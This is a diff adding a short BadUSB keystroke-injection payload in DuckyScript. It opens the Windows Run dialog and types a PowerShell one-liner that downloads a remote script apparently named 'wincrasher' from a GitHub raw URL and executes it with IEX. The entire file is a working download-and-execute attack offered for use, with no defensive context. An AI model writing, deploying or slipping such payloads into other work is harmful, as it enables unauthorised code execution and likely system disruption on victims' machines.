@@ -1,0 +1,4 @@
+GUI r
+DELAY 200
+STRING powershell IEX((New-Object Net.Webclient).DownloadString('https://raw.githubusercontent.com/jester-var/badusbstuff/refs/heads/main/wincrasher/main.ps1'));main
+ENTER
